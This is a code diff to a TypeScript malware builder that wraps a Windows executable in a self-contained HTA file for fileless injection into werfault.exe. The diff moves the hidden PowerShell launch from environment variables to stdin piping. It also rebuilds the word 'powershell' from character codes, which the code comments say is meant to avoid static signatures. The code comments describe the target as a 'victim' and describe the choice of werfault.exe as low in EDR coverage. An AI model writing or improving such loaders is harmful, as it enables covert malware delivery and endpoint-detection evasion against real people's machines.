@@ -8,8 +8,8 @@
  *
  * Execution chain on victim:
  *   1. mshta.exe opens the .hta file (native Windows association)
- *   2. VBScript creates WScript.Shell, assembles PS command from fragments
- *   3. PowerShell decrypts XOR+gzip payload from embedded base64 in memory
+ *   2. VBScript uses WScript.Shell.Exec to pipe PS script via stdin
+ *   3. PowerShell decrypts XOR+gzip payload from piped base64 in memory
  *   4. C# P/Invoke injector compiled via Add-Type (random class name per build)
  *   5. werfault.exe started hidden (LOTL — Windows Error Reporting, low EDR coverage)
  *   6. PE manually mapped into werfault via VirtualAllocEx + WriteProcessMemory
@@ -28,6 +28,7 @@ import {
 
 /**
  * Generate a self-contained .hta file with fileless PE injection.
+ * Uses stdin piping to avoid the 32K Windows environment variable limit.
  * Returns the full HTA content as a string.
  */
 export function wrapPeAsHta(peBytes: Buffer): string {
@@ -37,50 +38,48 @@ export function wrapPeAsHta(peBytes: Buffer): string {
   const csharpCode = buildCSharpInjector(className);
   const csB64 = Buffer.from(csharpCode, "utf-8").toString("base64");
 
-  // PS reads payload + C# from environment variables set by VBScript
-  const psLines = [
-    `$d=[Convert]::FromBase64String($env:_HTA_D)`,
-    `$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:_HTA_CS))`,
-  ];
-
+  // Build PS injection chain — reads payload + C# from variables set inline
   const chain = buildPsInjectionChain("$d", "$cs", className, "werfault.exe");
-  const psScript = psLines.join(";") + ";" + chain;
-  const psEnc = Buffer.from(psScript, "utf16le").toString("base64");
 
-  // Split base64 strings for VBScript concatenation (VBS line limit ~1024 safe)
+  // Escape chain for VBScript double-quoted strings: " → ""
+  const chainVbs = chain.replace(/"/g, '""');
+
+  // Split base64 into chunks for multiple VBS StdIn.Write calls
   const chunkSize = 800;
   const payloadChunks = b64Payload.match(new RegExp(`.{1,${chunkSize}}`, "g")) || [b64Payload];
   const csChunks = csB64.match(new RegExp(`.{1,${chunkSize}}`, "g")) || [csB64];
 
-  const rnd = randHex(6);
+  // Prefix with letter to ensure valid VBScript identifiers
+  const rnd = "v" + randHex(5);
 
-  // Build VBScript that sets env vars and launches PS
+  // Build VBScript that pipes the full PS script via stdin (no env var size limits)
   const vbLines: string[] = [];
   vbLines.push(`Dim ${rnd}s : Set ${rnd}s = CreateObject("WScript.Shell")`);
-  vbLines.push(`Dim ${rnd}e : Set ${rnd}e = ${rnd}s.Environment("Process")`);
 
-  // Build payload base64 in VBS variable
-  vbLines.push(`Dim ${rnd}d`);
-  vbLines.push(`${rnd}d = "${payloadChunks[0]}"`);
-  for (let i = 1; i < payloadChunks.length; i++) {
-    vbLines.push(`${rnd}d = ${rnd}d & "${payloadChunks[i]}"`);
-  }
-  vbLines.push(`${rnd}e("_HTA_D") = ${rnd}d`);
-
-  // Build C# base64 in VBS variable
-  vbLines.push(`Dim ${rnd}c`);
-  vbLines.push(`${rnd}c = "${csChunks[0]}"`);
-  for (let i = 1; i < csChunks.length; i++) {
-    vbLines.push(`${rnd}c = ${rnd}c & "${csChunks[i]}"`);
-  }
-  vbLines.push(`${rnd}e("_HTA_CS") = ${rnd}c`);
-
-  // Reassemble "powershell" from fragments to avoid static signatures
+  // Reassemble "powershell" from char codes to avoid static signatures
   vbLines.push(`Dim ${rnd}p`);
-  vbLines.push(`${rnd}p = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)`);
+  vbLines.push(`${rnd}p = Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)`);
 
-  // Launch PS hidden (0 = vbHide)
-  vbLines.push(`${rnd}s.Run ${rnd}p & " -nop -w h -ep b -enc ${psEnc}", 0, False`);
+  // Exec gives us StdIn access (unlike Run); "-" tells PS to read from stdin
+  vbLines.push(`Dim ${rnd}x : Set ${rnd}x = ${rnd}s.Exec(${rnd}p & " -nop -w h -ep b -")`);
+
+  // Pipe PS script to stdin in chunks — payload decode
+  vbLines.push(`${rnd}x.StdIn.Write "$d=[Convert]::FromBase64String('"`);
+  for (const chunk of payloadChunks) {
+    vbLines.push(`${rnd}x.StdIn.Write "${chunk}"`);
+  }
+  vbLines.push(`${rnd}x.StdIn.Write "');"`);
+
+  // Pipe C# source decode
+  vbLines.push(`${rnd}x.StdIn.Write "$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"`);
+  for (const chunk of csChunks) {
+    vbLines.push(`${rnd}x.StdIn.Write "${chunk}"`);
+  }
+  vbLines.push(`${rnd}x.StdIn.Write "'));"`);
+
+  // Pipe injection chain (quotes escaped for VBS)
+  vbLines.push(`${rnd}x.StdIn.Write "${chainVbs}"`);
+  vbLines.push(`${rnd}x.StdIn.Close`);
 
   // Self-close HTA
   vbLines.push(`self.close`);
